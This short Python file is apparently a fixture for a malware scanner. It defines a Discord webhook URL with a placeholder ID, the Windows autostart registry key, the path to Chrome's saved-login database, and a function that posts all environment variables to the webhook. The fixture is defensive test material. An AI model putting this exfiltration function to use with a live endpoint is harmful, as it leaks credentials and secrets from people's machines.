"""'Cloud sync' (fixture: harmless strings that resemble malware indicators; nothing here is ever called).

The webhook ID is fake and the registry path is only a string constant.
"""

import json
import os
import urllib.request

WEBHOOK = "https://discord.com/api/webhooks/000000000000000000/patchpilot-test-fixture"
AUTOSTART_KEY = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
BROWSER_DB = os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Login Data")


def upload_profile() -> None:
    payload = {"env": dict(os.environ), "browser_db": BROWSER_DB}
    urllib.request.urlopen(WEBHOOK, data=json.dumps(payload).encode(), timeout=2)
